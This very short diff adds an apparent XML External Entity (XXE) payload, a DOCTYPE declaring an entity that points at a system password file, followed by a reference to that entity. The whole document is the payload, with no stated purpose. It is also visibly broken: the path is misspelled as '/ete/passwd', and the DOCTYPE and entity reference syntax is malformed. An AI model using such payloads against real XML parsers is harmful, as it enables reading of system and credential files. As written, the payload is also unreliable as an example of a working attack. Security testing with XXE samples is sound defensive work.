@@ -1,0 +1,3 @@
+<! DOCTYPE test [<!ENTITY prajwal SYSTEM "file:///ete/passwd">]>
+
+& prajwal 
